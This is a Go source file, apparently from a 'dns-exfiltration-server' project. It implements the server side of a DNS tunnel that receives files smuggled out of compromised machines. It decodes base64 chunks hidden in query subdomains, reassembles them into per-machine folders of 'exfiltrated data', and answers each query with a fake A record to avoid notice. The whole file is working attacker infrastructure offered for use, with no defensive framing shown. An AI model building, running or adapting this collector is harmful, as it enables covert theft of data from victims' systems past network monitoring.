package exfiltrator

import (
	"dns-exfiltration-server/fileutils"
	"encoding/base64"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"path"
	"strings"

	"github.com/miekg/dns"
)

const (
	// Messages carried by UDP are restricted to 512 bytes (not counting the IP
	// or UDP headers).
	// - https://www.rfc-editor.org/rfc/rfc1035#section-4.2.1
	MAX_UDP_PACKET_SIZE = 512
	EXFILTRATION_DIR    = "./exfiltrated-data"
)

type dnsExfiltrator struct {
	nameServer      string
	unprocessedData map[string][]byte
	openFiles       map[string]map[string]*os.File
}

func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
	absoluteNameServer := nameServer
	if nameServer[len(nameServer)-1] != '.' {
		absoluteNameServer += "."
	}

	fileutils.CreateDirIfNotExists(EXFILTRATION_DIR)

	return &dnsExfiltrator{
		nameServer:      absoluteNameServer,
		unprocessedData: make(map[string][]byte),
		openFiles:       make(map[string]map[string]*os.File),
	}
}

func decodeFromModifiedBase64(modifiedBase64Data string) ([]byte, error) {
	base64Data := strings.Replace(modifiedBase64Data, "-", "=", -1)
	return base64.URLEncoding.DecodeString(base64Data)
}

func getFilePathFromEncodedFilename(dir string, encodedFilename string) (string, error) {
	filename, err := decodeFromModifiedBase64(encodedFilename)
	if err != nil {
		errorMsg := fmt.Sprintf("Unable to decode filename: %s", encodedFilename)
		return "", errors.New(errorMsg)
	}
	return path.Join(dir, string(filename)), nil
}

func (ex *dnsExfiltrator) HandleDnsRequests(udpServer *net.UDPConn, nameServer string) {
	buf := make([]byte, MAX_UDP_PACKET_SIZE)
	for {
		_, clientAddr, err := udpServer.ReadFromUDP(buf)
		if err != nil {
			log.Println(err)
		}

		var request dns.Msg
		request.Unpack(buf)
		name := request.Question[0].Name
		subdomains := strings.Split(name, nameServer)[0]
		msgType, machineId, msg, err := func() (string, string, string, error) {
			x := strings.SplitN(subdomains, ".", 3)
			if len(x) != 3 || len(x[2]) == 0 {
				errorMsg := fmt.Sprintf("Received malformed DNS request: %s", name)
				return "", "", "", errors.New(errorMsg)
			}
			return x[0], x[1], x[2], nil
		}()
		if err != nil {
			log.Println(err)
			continue
		}
		data := strings.ReplaceAll(msg, ".", "")

		clientDir := path.Join(EXFILTRATION_DIR, machineId)

		// Initialise the inner map if uninitialised.
		if _, ok := ex.openFiles[machineId]; !ok {
			ex.openFiles[machineId] = make(map[string]*os.File)
		}

		switch msgType {
		case DNS_FILE_START.String():
			fileutils.CreateDirIfNotExists(clientDir)
			filename, err := getFilePathFromEncodedFilename(clientDir, data)
			if err != nil {
				log.Println(err)
				break
			}
			file := fileutils.CreateFileIfNotExists(filename)
			ex.openFiles[machineId][filename] = file
		case DNS_FILE_END.String():
			filename, err := getFilePathFromEncodedFilename(clientDir, data)
			if err != nil {
				log.Println(err)
				break
			}
			file := ex.openFiles[machineId][filename]
			if file == nil {
				log.Println("Received a DNS_FILE_END message without a corresponding DNS_FILE_START message for file:", filename)
				break
			}
			decodedData, err := decodeFromModifiedBase64(string(ex.unprocessedData[machineId]))
			if err != nil {
				log.Println("Unable to decode data for file:", filename)
				break
			}
			_, err = file.Write(decodedData)
			if err != nil {
				log.Println(err)
				break
			}
			err = file.Close()
			if err != nil {
				log.Println(err)
				break
			}
			ex.unprocessedData[machineId] = make([]byte, 0)
			log.Println("Successfully exfiltrated file:", filename)
		case DNS_FILE_DATA.String():
			// In case DNS requests get sent multiple times.
			if strings.Contains(string(ex.unprocessedData[machineId]), data) {
				break
			}
			ex.unprocessedData[machineId] = append(ex.unprocessedData[machineId], data...)
		default:
			log.Printf("Unknown message type: '%s'\n", msgType)
		}

		var reply dns.Msg
		reply.SetReply(&request)
		rr, err := dns.NewRR(fmt.Sprintf("%s 300 IN A 8.8.8.8", name))
		if err != nil {
			log.Println(err)
		}
		reply.Answer = append(reply.Answer, rr)

		response, err := reply.Pack()
		if err != nil {
			log.Println(err)
		}
		udpServer.WriteToUDP(response, clientAddr)
	}
}
